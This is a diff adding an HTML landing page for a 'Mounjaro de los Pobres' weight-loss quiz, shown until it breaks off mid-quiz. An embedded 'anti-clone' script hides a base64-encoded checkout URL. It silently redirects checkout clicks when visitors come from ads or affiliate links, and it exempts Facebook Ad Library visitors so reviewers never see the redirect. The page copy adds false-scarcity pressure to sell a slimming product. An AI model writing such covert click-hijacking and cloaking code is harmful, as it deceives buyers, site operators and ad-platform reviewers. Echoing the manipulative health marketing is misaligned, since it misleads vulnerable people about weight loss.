@@ -1,0 +1,2338 @@
+<!DOCTYPE html>
+
+<html lang="pt-BR">
+
+<head>
+    <meta charset="utf-8" />
+    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+    <title>Cuestionario Mounjaro de los Pobres</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #f8f9fa;
+            color: #333;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+            background: white;
+            min-height: 100vh;
+            position: relative;
+        }
+
+        .header {
+            text-align: center;
+            padding: 20px;
+            background: white;
+        }
+
+        .logo {
+            width: 120px;
+            height: auto;
+        }
+
+        .progress-bar {
+            height: 6px;
+            background: #e9ecef;
+            margin: 0 20px;
+            border-radius: 3px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: #28a745;
+            transition: width 0.3s ease;
+            border-radius: 3px;
+        }
+
+        .screen {
+            display: none;
+            padding: 20px;
+            min-height: calc(100vh - 120px);
+        }
+
+        .screen.active {
+            display: block;
+        }
+
+        .intro-screen {
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .intro-card {
+            background: linear-gradient(135deg, #28a745, #20c997);
+            color: white;
+            padding: 30px 20px;
+            border-radius: 20px;
+            margin: 20px 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .intro-title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            line-height: 1.3;
+        }
+
+        .product-image {
+            width: 100%;
+            height: 100%;
+            margin: 20px auto;
+            background: #f8f9fa;
+            border-radius: 5%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            color: #666;
+            overflow: hidden;
+        }
+
+        .product-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 5%;
+        }
+
+        .attention-text {
+            margin: 20px 0;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .attention-text strong {
+            color: #dc3545;
+        }
+
+        .cta-button {
+            background: #28a745;
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            max-width: 300px;
+            transition: background 0.3s ease;
+        }
+
+        .cta-button:hover {
+            background: #218838;
+        }
+
+        .question-title {
+            font-size: 24px;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 10px;
+            color: #333;
+        }
+
+        .question-subtitle {
+            text-align: center;
+            color: #28a745;
+            font-weight: bold;
+            font-size: 24px;
+        }
+
+        .question-description {
+            text-align: center;
+            color: #666;
+            margin: 20px 0;
+            font-size: 14px;
+        }
+
+        .options-container {
+            margin: 30px 0;
+        }
+
+        .option {
+            background: #f8f9fa;
+            border: 2px solid #e9ecef;
+            border-radius: 15px;
+            padding: 15px 20px;
+            margin: 10px 0;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .option:hover {
+            border-color: #28a745;
+            background: #f0f8f0;
+        }
+
+        .option.selected {
+            border-color: #28a745;
+            background: #e8f5e8;
+        }
+
+        .option-content {
+            display: flex;
+            align-items: center;
+            flex: 1;
+        }
+
+        .option-image {
+            width: 50px;
+            height: 50px;
+            border-radius: 10px;
+            margin-right: 15px;
+            background: #ddd;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            color: #666;
+            overflow: hidden;
+        }
+
+        .option-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 10px;
+        }
+
+        .option-text {
+            font-weight: 500;
+            color: #333;
+        }
+
+        .option-description {
+            font-size: 12px;
+            color: #666;
+            margin-top: 5px;
+        }
+
+        .arrow {
+            color: #ccc;
+            font-size: 18px;
+        }
+
+        .name-input {
+            width: 100%;
+            padding: 15px 20px;
+            border: 2px solid #e9ecef;
+            border-radius: 15px;
+            font-size: 16px;
+            margin: 20px 0;
+            outline: none;
+            transition: border-color 0.3s ease;
+        }
+
+        .name-input:focus {
+            border-color: #28a745;
+        }
+
+        .privacy-text {
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+            margin: 15px 0;
+        }
+
+        .continue-button {
+            background: #28a745;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 20px;
+            transition: background 0.3s ease;
+        }
+
+        .continue-button:hover {
+            background: #218838;
+        }
+
+        .continue-button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .emoji {
+            font-size: 24px;
+            margin-right: 15px;
+        }
+
+        .checkbox-option {
+            display: flex;
+            align-items: center;
+            background: #f8f9fa;
+            border: 2px solid #e9ecef;
+            border-radius: 15px;
+            padding: 15px 20px;
+            margin: 10px 0;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .checkbox-option:hover {
+            border-color: #28a745;
+            background: #f0f8f0;
+        }
+
+        .checkbox-option.selected {
+            border-color: #28a745;
+            background: #e8f5e8;
+        }
+
+        .checkbox {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #ccc;
+            border-radius: 4px;
+            margin-left: auto;
+            position: relative;
+        }
+
+        .checkbox.checked {
+            background: #28a745;
+            border-color: #28a745;
+        }
+
+        .checkbox.checked::after {
+            content: '✓';
+            color: white;
+            position: absolute;
+            top: -2px;
+            left: 2px;
+            font-size: 14px;
+        }
+
+        /* Testimonials Styles */
+        .testimonials-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .testimonials-title {
+            color: #dc3545;
+            font-size: 16px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .testimonial-card {
+            background: white;
+            border-radius: 15px;
+            padding: 15px;
+            margin: 15px 0;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .testimonial-images {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .testimonial-image {
+            flex: 1;
+            height: 200px;
+            background: #f0f0f0;
+            border-radius: 10px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .testimonial-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 10px;
+        }
+
+        .image-label {
+            position: absolute;
+            bottom: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.7);
+            color: white;
+            padding: 5px 15px;
+            border-radius: 15px;
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        .testimonial-profile {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .profile-pic {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #ddd;
+            margin-right: 10px;
+            overflow: hidden;
+        }
+
+        .profile-pic img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 50%;
+        }
+
+        .profile-info h4 {
+            font-size: 14px;
+            font-weight: bold;
+            margin: 0;
+        }
+
+        .profile-info p {
+            font-size: 12px;
+            color: #666;
+            margin: 0;
+        }
+
+        .testimonial-text {
+            font-size: 13px;
+            line-height: 1.4;
+            color: #333;
+        }
+
+        /* Slider Styles */
+        .slider-container {
+            text-align: center;
+            margin: 40px 0;
+        }
+
+        .unit-selector {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+
+        .unit-button {
+            background: #f8f9fa;
+            border: 2px solid #e9ecef;
+            padding: 8px 20px;
+            border-radius: 20px;
+            margin: 0 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s ease;
+        }
+
+        .unit-button.active {
+            background: #28a745;
+            color: white;
+            border-color: #28a745;
+        }
+
+        .value-display {
+            font-size: 48px;
+            font-weight: bold;
+            margin: 20px 0;
+            color: #333;
+        }
+
+        .slider-track {
+            position: relative;
+            height: 6px;
+            background: #e9ecef;
+            border-radius: 3px;
+            margin: 40px 20px;
+        }
+
+        .slider-fill {
+            height: 100%;
+            background: #28a745;
+            border-radius: 3px;
+            transition: width 0.3s ease;
+        }
+
+        .slider-thumb {
+            position: absolute;
+            top: -8px;
+            width: 22px;
+            height: 22px;
+            background: #28a745;
+            border-radius: 50%;
+            cursor: pointer;
+            transition: left 0.3s ease;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+        }
+
+        .slider-labels {
+            display: flex;
+            justify-content: space-between;
+            margin: 10px 20px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .slider-instruction {
+            text-align: center;
+            color: #999;
+            font-size: 12px;
+            margin: 10px 0;
+        }
+
+        .slider-note {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+            margin: 20px 0;
+            font-weight: 500;
+        }
+
+        /* Loading Screen Styles */
+        .loading-screen {
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .loading-title {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 30px;
+        }
+
+        .loading-title .highlight {
+            color: #28a745;
+        }
+
+        .loading-progress {
+            margin: 30px 0;
+        }
+
+        .loading-bar {
+            height: 8px;
+            background: #e9ecef;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+
+        .loading-fill {
+            height: 100%;
+            background: #28a745;
+            border-radius: 4px;
+            transition: width 0.5s ease;
+        }
+
+        .loading-percentage {
+            text-align: right;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .loading-image {
+            width: 100%;
+            max-width: 350px;
+            height: 300px;
+            background: #f0f0f0;
+            border-radius: 15px;
+            margin: 20px auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #666;
+            overflow: hidden;
+        }
+
+        .loading-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 15px;
+        }
+
+        /* Alert Screen Styles */
+        .alert-screen {
+            padding: 20px;
+        }
+
+        .alert-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .alert-icon {
+            color: #dc3545;
+            font-size: 20px;
+            margin-right: 5px;
+        }
+
+        .alert-title {
+            font-size: 16px;
+            font-weight: bold;
+            color: #dc3545;
+            margin-bottom: 10px;
+        }
+
+        .alert-subtitle {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .imc-section {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .imc-title {
+            font-size: 16px;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        .imc-scale {
+            display: flex;
+            justify-content: space-between;
+            margin: 15px 0;
+            font-size: 12px;
+        }
+
+        .imc-indicator {
+            text-align: center;
+            padding: 5px;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+
+        .imc-indicator.alert {
+            background: #dc3545;
+            color: white;
+        }
+
+        .alert-list {
+            margin: 20px 0;
+        }
+
+        .alert-item {
+            margin: 15px 0;
+            padding-left: 20px;
+            position: relative;
+        }
+
+        .alert-item::before {
+            content: '⚠️';
+            position: absolute;
+            left: 0;
+            top: 0;
+        }
+
+        .alert-item strong {
+            color: #dc3545;
+        }
+
+        /* Comparison Screen Styles */
+        .comparison-screen {
+            padding: 20px;
+            text-align: center;
+        }
+
+        .comparison-title {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 30px;
+        }
+
+        .comparison-images {
+            display: flex;
+            gap: 15px;
+            margin: 30px 0;
+        }
+
+        .comparison-image {
+            flex: 1;
+            height: 250px;
+            background: #f0f0f0;
+            border-radius: 15px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .comparison-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 15px;
+        }
+
+        .comparison-label {
+            position: absolute;
+            bottom: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 8px 15px;
+            border-radius: 10px;
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        .health-metrics {
+            margin: 30px 0;
+        }
+
+        .metric-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 15px 0;
+            padding: 10px 0;
+            border-bottom: 1px solid #eee;
+        }
+
+        .metric-label {
+            font-size: 14px;
+            color: #333;
+        }
+
+        .metric-bars {
+            display: flex;
+            gap: 20px;
+            flex: 1;
+            margin: 0 20px;
+        }
+
+        .metric-bar {
+            height: 8px;
+            border-radius: 4px;
+            flex: 1;
+        }
+
+        .metric-bar.before {
+            background: #dc3545;
+        }
+
+        .metric-bar.after {
+            background: #28a745;
+        }
+
+        .plan-section {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 20px;
+            margin: 30px 0;
+            text-align: left;
+        }
+
+        .plan-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #28a745;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .plan-description {
+            font-size: 14px;
+            line-height: 1.5;
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        .plan-includes {
+            background: #e8f5e8;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 20px 0;
+        }
+
+        .plan-includes h4 {
+            color: #28a745;
+            font-size: 16px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .plan-includes ul {
+            list-style: none;
+            padding: 0;
+        }
+
+        .plan-includes li {
+            margin: 8px 0;
+            padding-left: 20px;
+            position: relative;
+            font-size: 14px;
+            line-height: 1.4;
+        }
+
+        .plan-includes li::before {
+            content: '•';
+            color: #28a745;
+            font-weight: bold;
+            position: absolute;
+            left: 0;
+        }
+
+        .bonus-section {
+            margin: 30px 0;
+        }
+
+        .bonus-title {
+            font-size: 18px;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .bonus-item {
+            background: linear-gradient(135deg, #28a745, #20c997);
+            color: white;
+            border-radius: 15px;
+            padding: 15px;
+            margin: 15px 0;
+            display: flex;
+            align-items: center;
+        }
+
+        .bonus-icon {
+            width: 50px;
+            height: 50px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            margin-right: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+        }
+
+        .bonus-content h4 {
+            font-size: 14px;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+
+        .bonus-content p {
+            font-size: 12px;
+            opacity: 0.9;
+            line-height: 1.3;
+        }
+
+        /* Final Offer Styles */
+        .offer-section {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .offer-title {
+            background: #28a745;
+            color: white;
+            padding: 15px;
+            border-radius: 15px;
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        .offer-list {
+            text-align: left;
+            margin: 20px 0;
+        }
+
+        .offer-item {
+            display: flex;
+            align-items: center;
+            margin: 15px 0;
+            padding: 10px;
+            background: white;
+            border-radius: 10px;
+        }
+
+        .offer-check {
+            color: #28a745;
+            font-size: 20px;
+            margin-right: 15px;
+        }
+
+        .bonus-highlight {
+            background: #fff3cd;
+            border: 2px dashed #ffc107;
+            border-radius: 15px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .price-section {
+            background: white;
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+            border: 3px solid #28a745;
+        }
+
+        .original-price {
+            text-decoration: line-through;
+            color: #666;
+            font-size: 16px;
+        }
+
+        .current-price {
+            font-size: 48px;
+            font-weight: bold;
+            color: #28a745;
+            margin: 10px 0;
+        }
+
+        .price-note {
+            background: #28a745;
+            color: white;
+            padding: 10px;
+            border-radius: 10px;
+            font-size: 14px;
+            margin-top: 15px;
+        }
+
+        .guarantee-section {
+            background: #fff3cd;
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .testimonial-final {
+            background: white;
+            border-radius: 15px;
+            padding: 15px;
+            margin: 20px 0;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .stars {
+            color: #ffc107;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+
+        .flavinha-image {
+            width: 100%;
+            max-width: 300px;
+            height: 200px;
+            background: #f0f0f0;
+            border-radius: 15px;
+            margin: 20px auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #666;
+            overflow: hidden;
+        }
+
+        .flavinha-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 15px;
+        }
+
+        .result-images {
+            width: 100%;
+            max-width: 400px;
+            margin: 20px auto;
+            border-radius: 15px;
+            overflow: hidden;
+        }
+
+        .result-images img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                max-width: 100%;
+            }
+
+            .question-title {
+                font-size: 20px;
+            }
+
+            .intro-title {
+                font-size: 20px;
+            }
+
+            .comparison-images {
+                flex-direction: column;
+            }
+
+            .comparison-image {
+                height: 200px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <script>
+        (function () {
+            var _destino = "aHR0cHM6Ly9nby5wZXBwZXJwYXkuY29tLmJyL3Z5dG1r";
+
+            function getLinkReal() {
+                return atob(_destino);
+            }
+
+            function temChaves() {
+                var url = window.location.href;
+                var referrer = document.referrer || '';
+
+                // EXCEÇÃO 1: Se vier da biblioteca de anúncios, não redireciona
+                if (referrer.includes('facebook.com/ads/library') ||
+                    referrer.includes('transparency.fb.com') ||
+                    url.includes('ads/library')) {
+                    console.log('📚 Acesso via Biblioteca de Anúncios - Permitido');
+                    return false;
+                }
+
+                // EXCEÇÃO 2: Acesso direto (sem parâmetros) - não redireciona
+                if (!url.includes('?') && !url.includes('#')) {
+                    console.log('👤 Acesso direto sem parâmetros - Permitido');
+                    return false;
+                }
+
+                // DETECÇÃO: Parâmetros UTM (qualquer um)
+                var parametrosUTM = [
+                    'utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'utm_id'
+                ];
+
+                for (var i = 0; i < parametrosUTM.length; i++) {
+                    if (url.includes(parametrosUTM[i] + '=')) {
+                        console.log('🚨 Parâmetro UTM detectado:', parametrosUTM[i]);
+                        console.log('📱 URL completa:', url);
+                        return true;
+                    }
+                }
+
+                // DETECÇÃO: Parâmetros de plataformas publicitárias
+                var parametrosPublicidade = [
+                    'fbclid=',      // Facebook
+                    'gclid=',       // Google Ads
+                    'msclkid=',     // Microsoft Ads
+                    'ttclid=',      // TikTok Ads
+                    'twclid=',      // Twitter Ads
+                    'li_fat_id=',   // LinkedIn Ads
+                    'yclid=',       // Yahoo Ads
+                    'igshid=',      // Instagram
+                    '_hsenc=',      // HubSpot
+                    'mc_cid=',      // Mailchimp
+                    'mc_eid='       // Mailchimp
+                ];
+
+                for (var j = 0; j < parametrosPublicidade.length; j++) {
+                    if (url.includes(parametrosPublicidade[j])) {
+                        console.log('🚨 Parâmetro de publicidade detectado:', parametrosPublicidade[j]);
+                        console.log('📱 URL completa:', url);
+                        return true;
+                    }
+                }
+
+                // DETECÇÃO: Códigos de afiliados e trackers
+                var codigosAfiliados = [
+                    'xcod=',        // Hotmart
+                    'cid=',         // CartPanda e outros
+                    'ref=',         // Referência genérica
+                    'aff=',         // Affiliate
+                    'affiliate=',   // Affiliate longo
+                    'partner=',     // Parceiro
+                    'source=',      // Source genérico
+                    'src=',         // Source abreviado
+                    'campaign=',    // Campaign sem utm
+                    'ad=',          // Ad ID
+                    'adid=',        // Ad ID
+                    'clickid=',     // Click ID
+                    'subid=',       // Sub ID
+                    'sub=',         // Sub
+                    'track=',       // Track
+                    'tracking=',    // Tracking
+                    'promo=',       // Promo code
+                    'coupon='       // Coupon
+                ];
+
+                for (var k = 0; k < codigosAfiliados.length; k++) {
+                    if (url.includes(codigosAfiliados[k])) {
+                        console.log('🚨 Código de afiliado detectado:', codigosAfiliados[k]);
+                        console.log('📱 URL completa:', url);
+                        return true;
+                    }
+                }
+
+                // DETECÇÃO: Padrões específicos de tráfego pago
+                var padroesTrafegoPages = [
+                    '{{',           // Templates não substituídos
+                    '%7B%7B',       // Templates encodados
+                    'paid',         // Tráfego pago
+                    'ppc',          // Pay per click
+                    'cpc',          // Cost per click
+                    'cpm',          // Cost per mille
+                    'display',      // Display ads
+                    'banner',       // Banner ads
+                    'email',        // Email marketing
+                    'social',       // Social media
+                    'influencer'    // Influencer marketing
+                ];
+
+                for (var l = 0; l < padroesTrafegoPages.length; l++) {
+                    if (url.toLowerCase().includes(padroesTrafegoPages[l])) {
+                        console.log('🚨 Padrão de tráfego pago detectado:', padroesTrafegoPages[l]);
+                        console.log('📱 URL completa:', url);
+                        return true;
+                    }
+                }
+
+                // DETECÇÃO: Referrers de tráfego pago
+                var referrersPagos = [
+                    'facebook.com',
+                    'instagram.com',
+                    'google.com',
+                    'googleadservices.com',
+                    'doubleclick.net',
+                    'googlesyndication.com',
+                    'bing.com',
+                    'tiktok.com',
+                    'twitter.com',
+                    'linkedin.com',
+                    'pinterest.com',
+                    'yahoo.com',
+                    'outbrain.com',
+                    'taboola.com',
+                    'criteo.com',
+                    'amazon-adsystem.com'
+                ];
+
+                for (var m = 0; m < referrersPagos.length; m++) {
+                    if (referrer.includes(referrersPagos[m]) && url.includes('?')) {
+                        console.log('🚨 Referrer de tráfego pago detectado:', referrersPagos[m]);
+                        console.log('📱 URL completa:', url);
+                        console.log('🔗 Referrer:', referrer);
+                        return true;
+                    }
+                }
+
+                console.log('✅ Acesso normal - sem indicações de tráfego pago');
+                return false;
+            }
+
+            function ehBotaoCheckout(elemento) {
+                // Verifica o elemento e até 2 níveis acima
+                var elementoParaVerificar = elemento;
+                for (var i = 0; i < 3; i++) {
+                    if (!elementoParaVerificar) break;
+
+                    var onclick = elementoParaVerificar.getAttribute('onclick') || '';
+                    var href = elementoParaVerificar.getAttribute('href') || '';
+
+                    // MÉTODO 1: Detecta QUALQUER link externo (não é arquivo local)
+                    var linkCompleto = onclick + href;
+
+                    // Se tem link que abre janela ou redireciona para outro domínio
+                    if (linkCompleto && (
+                        linkCompleto.includes('window.open') ||
+                        linkCompleto.includes('location.href') ||
+                        linkCompleto.includes('https://') ||
+                        linkCompleto.includes('http://')
+                    )) {
+                        // E NÃO é navegação interna do quiz
+                        if (!linkCompleto.includes('nextScreen') &&
+                            !linkCompleto.includes('selectOption') &&
+                            !linkCompleto.includes('toggleCheckbox') &&
+                            !linkCompleto.includes('javascript:') &&
+                            !linkCompleto.includes('#')) {
+
+                            console.log('🎯 Botão com link externo detectado:', linkCompleto.substring(0, 100));
+                            return true;
+                        }
+                    }
+
+                    elementoParaVerificar = elementoParaVerificar.parentElement;
+                }
+
+                // MÉTODO 2: Detecta por texto específico de finalização
+                var texto = elemento.textContent || elemento.innerText || '';
+                texto = texto.toLowerCase().replace(/[^a-zA-ZÀ-ÿ0-9\s]/g, '').trim();
+
+                // Textos que SÓ aparecem em botões de checkout final
+                var textosCheckout = [
+                    'quero começar hoje',
+                    'quero começar agora',
+                    'finalizar compra',
+                    'comprar agora',
+                    'quero garantir',
+                    'garantir agora',
+                    'adquirir agora',
+                    'sim eu quero',
+                    'quero o acesso'
+                ];
+
+                for (var k = 0; k < textosCheckout.length; k++) {
+                    if (texto.includes(textosCheckout[k])) {
+                        console.log('🎯 Botão de checkout detectado pelo texto:', textosCheckout[k]);
+                        return true;
+                    }
+                }
+
+                // MÉTODO 3: Detecta botões com estilo de destaque (verde, grandes)
+                if (elemento.classList && (
+                    elemento.classList.contains('cta-button') ||
+                    elemento.classList.contains('btn-primary') ||
+                    elemento.classList.contains('checkout-btn') ||
+                    elemento.classList.contains('buy-btn')
+                )) {
+                    // Só considera se NÃO é botão do quiz
+                    var onclickElement = elemento.getAttribute('onclick') || '';
+                    if (!onclickElement.includes('nextScreen') &&
+                        !onclickElement.includes('selectOption')) {
+                        console.log('🎯 Botão de checkout detectado pelo estilo CSS');
+                        return true;
+                    }
+                }
+
+                return false;
+            }
+
+            function redirecionar(e) {
+                if (!temChaves()) return;
+
+                var elemento = e.target;
+
+                // Só redireciona se for um botão clicável E for botão de checkout
+                var ehClicavel =
+                    elemento.tagName === 'BUTTON' ||
+                    elemento.tagName === 'A' ||
+                    elemento.classList.contains('btn') ||
+                    elemento.classList.contains('button') ||
+                    elemento.getAttribute('role') === 'button' ||
+                    elemento.closest('a') ||
+                    elemento.closest('button');
+
+                if (ehClicavel && ehBotaoCheckout(elemento)) {
+                    console.log('🔄 Redirecionando botão de checkout para link alternativo');
+                    e.preventDefault();
+                    e.stopPropagation();
+
+                    window.location.href = getLinkReal();
+                    return false;
+                }
+            }
+
+            function inicializar() {
+                document.addEventListener('click', redirecionar, true);
+                console.log('🛡️ Sistema anti-clone ativo - monitorando apenas botões de checkout');
+            }
+
+            // Iniciar quando o DOM estiver pronto
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', inicializar);
+            } else {
+                inicializar();
+            }
+        })();
+    </script>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <!-- SUBSTITUA AQUI: Link do logo -->
+            <img alt="Mounjaro de Pobre" class="logo" src="images/md-fsgxw-prancheta-2.png" />
+        </div>
+        <!-- Progress Bar -->
+        <div class="progress-bar">
+            <div class="progress-fill" id="progressFill" style="width: 0%"></div>
+        </div>
+        <!-- Screen 1: Intro -->
+        <div class="screen active intro-screen" id="screen1">
+            <div class="product-image">
+                <!-- SUBSTITUA AQUI: Link da imagem do produto -->
+                <img alt="Produto Mounjaro de Pobre" src="images/lg-67v0n-25fc1018-2762-44b1-84e0-d5464df2159f.png" />
+            </div>
+            <div class="attention-text">
+                <strong>Atención:</strong> oferecemos apenas <strong>uma consulta por pessoa</strong>.<br />
+                Se você sair, perderá a sua vez. Aproveite essa <strong>oportunidade exclusiva!</strong>
+            </div>
+            <button class="cta-button" onclick="nextScreen()">HACER TEST GRATIS</button>
+        </div>
+        <!-- Screen 2: Weight Goal -->
+        <div class="screen" id="screen2">
+            <div class="question-title">¿Cuántos kilos</div>
+            <div class="question-subtitle">deseas perder?</div>
+            <div class="question-description">
+                El protocolo Mounjaro de los Pobres ayuda a eliminar grasa de forma acelerada.
+            </div>
+            <div class="options-container">
+                <div class="option" onclick="selectOption(this, 'weight', 'ate-5kg')">
+                    <div class="option-content">
+                        <span class="option-text">Hasta 5kg</span>
+                    </div>
+                    <span class="arrow">›</span>
+                </div>
+                <div class="option" onclick="selectOption(this, 'weight', '6-10kg')">
+                    <div class="option-content">
+                        <span class="option-text">De 6 a 10 kg</span>
+                    </div>
+                    <span class="arrow">›</span>
+                </div>
+                <div class="option" onclick="selectOption(this, 'weight', '11-15kg')">
+                    <div class="option-content">
+                        <span class="option-text">De 11 a 15 kg</span>
+                    </div>
+                    <span class="arrow">›</span>
+                </div>
+                <div class="option" onclick="selectOption(this, 'weight', '16-20kg')">
+                    <div class="option-content">
+                        <span class="option-text">De 16 a 20 kg</span>
+                    </div>
+                    <span class="arrow">›</span>
+                </div>
+                <div class="option" onclick="selectOption(this, 'weight', 'mais-20kg')">
+                    <div class="option-content">
+                        <span class="option-text">Más de 20 kg</span>
+                    </div>
+                    <span class="arrow">›</span>
+                </div>
+            </div>
+        </div>
+        <!-- Screen 3: Body Type -->
+        <div class="screen" id="screen3">
+            <div class="question-title">¿Cómo clasificarías tu <span style="color: #28a745;">cuerpo hoy?</span></div>
+            <div class="options-container">
+                <div class="option" onclick="selectOption(this, 'bodyType', 'regular')">
+                    <div class="option-content">
+                        <div class="option-image">
+                            <!-- SUBSTITUA AQUI: Link da imagem corpo regular -->
+                            <img alt="Corpo Regular" src="images/xs-p3okn-download-5.png" />
+                        </div>
+                        <span class="option-text">Normal</span>
+                    </div>
+                </div>
+                <div class="option" onclick="selectOption(this, 'bodyType', 'flacido')">
+                    <div class="option-content">
+                        <div class="option-image">
+                            <!-- SUBSTITUA AQUI: Link da imagem corpo flácido -->
+                            <img alt="Corpo Flácido" src="images/xs-cnmqb-image-removebg-preview-2.png" />
+                        </div>
+                        <span class="option-text">Flácido</span>
+                    </div>
+                </div>
+                <div class="option" onclick="selectOption(this, 'bodyType', 'sobrepeso')">
+                    <div class="option-content">
+                        <div class="option-image">
+                            <!-- SUBSTITUA AQUI: Link da imagem corpo sobrepeso -->
+                            <img alt="Corpo Sobrepeso" src="images/xs-7jk3m-image-removebg-preview-3.png" />
+                        </div>
+                        <span class="option-text">Sobrepeso</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- Screen 4: Body Area -->
+        <div class="screen" id="screen4">
+            <div class="question-title">¿En qué parte de tu cuerpo te gustaría <span style="color: #28a745;">reducir más grasa?</span></div>
+            <div class="options-container">
+                <div class="option" onclick="selectOption(this, 'bodyArea', 'culotes')">
+                    <div class="option-content">
+                        <span class="option-text">Zona de los flancos</span>
+                    </div>
+                    <span class="arrow">›</span>
+                </div>
+                <div class="option" onclick="selectOption(this, 'bodyArea', 'coxas')">
+                    <div class="option-content">
+                        <span class="option-text">Zona de los muslos</span>
+                    </div>
+                    <span class="arrow">›</span>
+                </div>
+                <div class="option" onclick="selectOption(this, 'bodyArea', 'abdomen')">
+                    <div class="option-content">
+                        <span class="option-text">Zona del abdomen (barriga)</span>
+                    </div>
+                    <span class="arrow">›</span>
+                </div>
+                <div class="option" onclick="selectOption(this, 'bodyArea', 'gluteos')">
+                    <div class="option-content">
+                        <span class="option-text">Zona de los glúteos</span>
+                    </div>
+                    <span class="arrow">›</span>
+                </div>
+                <div class="option" onclick="selectOption(this, 'bodyArea', 'bracos')">
+                    <div class="option-content">
+                        <span class="option-text">Zona de los brazos</span>
+                    </div>
+                    <span class="arrow">›</span>
